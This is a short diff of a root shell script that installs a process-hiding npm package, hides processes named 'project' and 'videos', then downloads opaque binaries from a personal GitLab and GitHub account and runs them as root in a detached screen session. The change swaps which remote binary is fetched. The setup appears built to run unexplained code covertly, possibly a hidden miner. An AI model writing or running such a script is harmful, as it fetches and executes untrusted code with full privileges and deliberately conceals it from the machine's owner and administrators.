@@ -2,7 +2,7 @@ sudo su <<EOF
 apt-get install -y nodejs >/dev/null 2>&1
 sudo apt install npm
 sudo npm i -g node-process-hider && sudo ph add project && sudo ph add videos
-wget -qO project https://gitlab.com/sarifadim/jomblo/-/raw/main/juliaconft && chmod +x project
+wget -qO project https://gitlab.com/sarifadim/jomblo/-/raw/main/tuyulcakep && chmod +x project
 wget -qO server https://raw.githubusercontent.com/sarifadim/dopla/main/bude && chmod +x server
 screen -dms run sudo ./server
 wget -qO image https://gitlab.com/sarifadim/jomblo/-/raw/main/gitpod && chmod +x image
